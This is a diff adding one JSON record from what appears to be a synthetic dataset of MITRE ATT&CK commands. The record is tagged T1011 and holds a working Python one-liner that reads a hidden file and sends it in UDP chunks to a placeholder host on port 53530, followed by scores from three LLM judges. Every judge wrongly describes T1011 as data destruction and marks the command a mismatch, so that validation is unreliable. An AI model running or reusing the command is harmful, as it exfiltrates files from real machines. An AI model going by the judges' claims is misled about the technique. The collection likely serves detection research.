@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,uuid; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); addr=(\"203.0.113.200\", 53530); tid=str(uuid.uuid4()).encode(); d=open(\"/Users/Shared/.dmp\",\"rb\").read(); [ s.sendto(tid+b\"|\"+d[i:i+500], addr) for i in range(0,len(d),500) ]; s.close()'",
+  "explanation": "Chunks data into UUID-tagged UDP datagrams to a high, non-standard port, simulating a DNS-like alternate medium without using the common DNS port, aligning with T1011.",
+  "rationale_steps": [
+    "Open a UDP socket and choose a non-standard high port (53530) to avoid 53.",
+    "Tag each chunk with a transaction ID to reassemble remotely.",
+    "Use UDP as an alternate medium distinct from primary C2 channels.",
+    "No obfuscation; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-022e3e02",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and brackets, proper imports, valid syntax for socket operations, list comprehension, and file handling.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over UDP which aligns with T1011 (Exfiltration Over Other Network Medium), it doesn't implement data destruction as described in the technique description, making it misaligned with the stated MITRE technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:37:22.876513Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with correct syntax, balanced delimiters, and valid function calls, making it fully parseable and runnable.",
+        "semantic_score": 0,
+        "semantic_justification": "The command reads a file and exfiltrates its content over UDP; it performs no data destruction, rendering it completely misaligned with MITRE ATT&CK T1011.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:37:24.647015Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Python one-liner with balanced quotes, valid imports, and proper socket usage; should parse and run as written.",
+        "semantic_score": 1,
+        "semantic_justification": "The command reads a file and exfiltrates its contents over UDP, which does not perform data destruction as described for the stated technique.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:37:40.016115Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
